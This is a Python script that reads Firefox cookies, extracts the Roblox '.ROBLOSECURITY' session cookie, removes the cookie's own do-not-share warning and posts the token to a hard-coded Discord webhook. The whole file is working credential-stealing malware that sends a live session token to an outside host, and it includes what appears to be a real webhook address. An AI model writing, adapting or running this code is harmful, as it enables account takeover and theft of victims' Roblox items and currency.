
import browser_cookie3
import re
import requests
web="https://discord.com/api/webhooks/1497224074345058424/F2a9ORUGAF47yWqkmuWQVarKI42eVW_9dlFnCKbukGg2-k3X0zVqHS-kLqbYfGTakulP"
cj = browser_cookie3.firefox()
for cookie in cj:
    if cookie.domain.endswith('roblox.com') and cookie.name == '.ROBLOSECURITY':
        raw_value = cookie.value
        important = raw_value.split("_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_", 1)[-1]
        requests.post(web, json={"content": f"```\n{important}\n```"})